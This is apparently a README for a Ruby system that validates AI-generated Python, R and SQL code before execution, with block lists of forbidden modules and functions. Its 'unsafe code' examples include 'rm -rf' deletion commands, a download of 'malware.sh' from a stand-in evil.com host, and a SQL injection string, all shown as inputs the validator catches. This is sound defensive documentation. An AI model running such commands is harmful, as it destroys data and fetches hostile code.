# Code Validation System

The Code Validation System provides comprehensive security and syntax validation for AI-generated code before execution. It protects against malicious code, prevents dangerous operations, and ensures code quality.

## Overview

The validation system uses a modular architecture with language-specific validators:

- **Base Validator**: Common validation logic and security patterns
- **Python Validator**: Python-specific syntax and security checks
- **R Validator**: R-specific function and package restrictions
- **SQL Validator**: SQL injection prevention and DDL blocking
- **Validator Factory**: Automatic validator selection by language

## Features

### Security Validation

- **Forbidden Imports/Packages**: Blocks dangerous modules (os, subprocess, sys, etc.)
- **System Commands**: Prevents shell execution and system calls
- **File Operations**: Restricts file system access
- **Network Operations**: Blocks network requests and downloads
- **Code Injection**: Detects eval(), exec(), dynamic imports
- **SQL Injection**: Pattern matching for common injection attacks
- **Resource Limits**: Enforces code length and line count limits

### Syntax Validation

- Bracket/parenthesis matching
- Quote balancing
- Language-specific syntax rules
- Indentation checking (Python)
- Assignment operator consistency (R)
- SQL query structure validation

### Violation Severity Levels

- **Critical**: System commands, code injection, file access
- **High**: Forbidden imports/functions, network access
- **Medium**: Dangerous operations
- **Low**: Resource limit violations
- **Info**: General notices

## Usage

### Basic Validation

```ruby
# Using the factory (recommended)
validator = CodeValidation::ValidatorFactory.build(:python, code)
result = validator.validate

if result.safe?
  # Code is valid and secure
  execute_code(code)
else
  # Handle errors and violations
  log_errors(result.errors)
  log_violations(result.violations)
end
```

### Direct Validator Usage

```ruby
# Python
validator = CodeValidation::PythonValidator.new(code)
result = validator.validate

# R
validator = CodeValidation::RValidator.new(code)
result = validator.validate

# SQL
validator = CodeValidation::SqlValidator.new(code)
result = validator.validate
```

### With Options

```ruby
validator = CodeValidation::PythonValidator.new(code, {
  max_code_length: 5000,
  max_lines: 500
})
result = validator.validate
```

## Validation Result

The `ValidationResult` struct provides comprehensive information:

```ruby
result.valid?          # Syntax is valid
result.safe?           # Valid AND no security violations
result.has_errors?     # Syntax errors present
result.has_warnings?   # Warnings present
result.has_violations? # Security violations detected

result.errors          # Array of error messages
result.warnings        # Array of warning messages
result.violations      # Array of violation hashes
result.metadata        # Additional validation metadata
```

### Violation Structure

```ruby
{
  type: :forbidden_import,           # Violation type
  message: "Import of forbidden module 'os'",
  description: "Forbidden import detected",
  severity: :high,                   # :critical, :high, :medium, :low, :info
  details: {                         # Additional context
    module: "os",
    line: "import os"
  }
}
```

## Integration with QueryAnalysisOrchestrator

The validation system is automatically integrated into the analysis pipeline:

```ruby
# In QueryAnalysisOrchestrator#execute_single_step
validation_result = validate_generated_code(generated_code, step.language)

if validation_result[:valid]
  # Execute code
  CodeExecutionJob.perform_later(step)
else
  # Log errors and mark step as failed
  step.update!(
    status: :failed,
    error_message: validation_result[:errors].join(", ")
  )
end
```

Validation results are stored in `analysis_request.metadata`:

```ruby
{
  "last_validation" => {
    "valid" => true,
    "errors" => [],
    "warnings" => ["SELECT * without LIMIT may return large result sets"],
    "violations" => [],
    "metadata" => {
      "line_count" => 15,
      "char_count" => 450
    }
  }
}
```

## Supported Languages

- **Python** (python, py)
- **R** (r)
- **SQL** (sql)

Check language support:

```ruby
CodeValidation::ValidatorFactory.supported?(:python)  # true
CodeValidation::ValidatorFactory.supported?(:javascript)  # false

CodeValidation::ValidatorFactory.supported_languages
# => ["python", "r", "sql"]
```

## Python Validator

### Forbidden Imports

```ruby
os, subprocess, sys, socket, http, urllib, requests,
shutil, pathlib, pickle, marshal, shelve, __import__,
eval, exec, compile, open
```

### Forbidden Functions

```ruby
eval, exec, compile, __import__, open, file, input,
raw_input, execfile, reload, __builtins__
```

### Dangerous Attributes

```ruby
__code__, __globals__, __closure__, __dict__,
__class__, __bases__, __subclasses__, __import__
```

### Example Safe Code

```python
import pandas as pd
import numpy as np
from sklearn.linear_model import LinearRegression

df = pd.read_csv('data.csv')
model = LinearRegression()
model.fit(df[['x']], df['y'])
predictions = model.predict(df[['x']])
```

### Example Unsafe Code

```python
import os
import subprocess

# Triggers violations
os.system('rm -rf /')
subprocess.run(['ls', '-la'])
eval(user_input)
```

## R Validator

### Forbidden Functions

```ruby
system, system2, shell, shell.exec, Sys.setenv,
file.create, file.remove, dir.create, unlink,
download.file, source, eval, parse, sink, setwd
```

### Forbidden Packages

```ruby
system, httr, RCurl, curl, downloader
```

### Example Safe Code

```r
library(ggplot2)
library(dplyr)

data <- read.csv('data.csv')
summary <- data %>%
  group_by(category) %>%
  summarize(mean_value = mean(value))

ggplot(summary, aes(x=category, y=mean_value)) +
  geom_bar(stat='identity')
```

### Example Unsafe Code

```r
# Triggers violations
system('rm -rf ~/')
file.remove('important.txt')
rm(list = ls())
download.file('http://evil.com/malware.sh', 'script.sh')
```

## SQL Validator

### Forbidden Operations

```ruby
DROP, TRUNCATE, ALTER, CREATE, GRANT, REVOKE,
EXECUTE, EXEC, xp_*, sp_*
```

### Dangerous Operations (require WHERE clause)

```ruby
UPDATE, DELETE, INSERT
```

### Example Safe Code

```sql
SELECT id, name, email, created_at
FROM users
WHERE status = 'active'
  AND created_at > '2024-01-01'
ORDER BY created_at DESC
LIMIT 100
```

### Example Unsafe Code

```sql
-- Triggers violations
DROP TABLE users;
DELETE FROM users;  -- No WHERE clause
UPDATE users SET role = 'admin';  -- No WHERE clause
SELECT * FROM users WHERE id = 1 OR 1=1;  -- SQL injection
```

## Extension Guide

### Adding a New Validator

1. Create validator class extending `BaseValidator`:

```ruby
module CodeValidation
  class JavascriptValidator < BaseValidator
    protected

    def validate_syntax
      # Implement syntax checking
    end

    def validate_security
      # Implement security checks
    end
  end
end
```

2. Update `ValidatorFactory`:

```ruby
case language
when "javascript", "js"
  JavascriptValidator.new(code, options)
# ...
end
```

3. Add to `supported_languages` array

4. Write comprehensive tests

### Adding Custom Security Checks

Override or extend methods in your validator:

```ruby
def validate_security
  super  # Call base security checks
  check_custom_patterns
end

def check_custom_patterns
  dangerous_patterns = [
    /your_pattern_here/i
  ]
  
  check_for_patterns(
    dangerous_patterns,
    :dangerous_operation,
    "Custom violation message"
  )
end
```

## Testing

Run the test suite:

```bash
rails test test/services/code_validation_test.rb
```

Test categories:
- Safe code acceptance tests
- Forbidden import/function detection
- Security violation detection
- Syntax error detection
- Factory pattern tests
- Resource limit tests
- Integration tests

## Security Considerations

### Defense in Depth

Code validation is **one layer** of security. Always combine with:

1. **Sandboxed Execution**: Run code in isolated Docker containers
2. **Resource Limits**: CPU, memory, timeout constraints
3. **Network Isolation**: No external network access
4. **Read-Only Filesystem**: Mount datasets read-only
5. **User Permissions**: Unprivileged container user
6. **Output Sanitization**: Validate and sanitize results

### False Positives

Some legitimate code may trigger warnings:

- `SELECT *` for small tables
- String concatenation in prepared statements
- Large data structures for valid use cases

Review warnings in context and adjust as needed.

### False Negatives

Validation cannot catch all security issues:

- Obfuscated malicious code
- Logic bombs with time delays
- Resource exhaustion attacks
- Side-channel attacks

Always run code in sandboxed environments.

## Performance

Validation is fast and synchronous:

- Python: ~1-5ms for typical code
- R: ~1-5ms for typical code
- SQL: ~1-3ms for typical queries

Caching is not needed for validation results as they're computed on-demand during the analysis pipeline.

## Logging

Validation events are logged at appropriate levels:

```ruby
Rails.logger.info "Code validation for #{language}: PASSED"
Rails.logger.warn "Security violations detected: forbidden_import, file_access"
Rails.logger.error "Validation error: #{e.message}"
```

Monitor logs for:
- Frequent validation failures (may indicate AI model issues)
- High-severity violations (security threats)
- Unexpected validation errors (bugs)

## Future Enhancements

Planned improvements:

- [ ] JavaScript/TypeScript validator
- [ ] Julia validator
- [ ] Scala validator
- [ ] More sophisticated Python AST parsing
- [ ] R code static analysis integration
- [ ] SQL query optimization suggestions
- [ ] Custom validation rule configuration
- [ ] Validation result caching (optional)
- [ ] Integration with external security scanners

## Contributing

When adding validators or security checks:

1. Research language-specific security issues
2. Document all forbidden operations
3. Write comprehensive tests (safe + unsafe examples)
4. Update this README
5. Consider performance impact
6. Test with real-world code samples
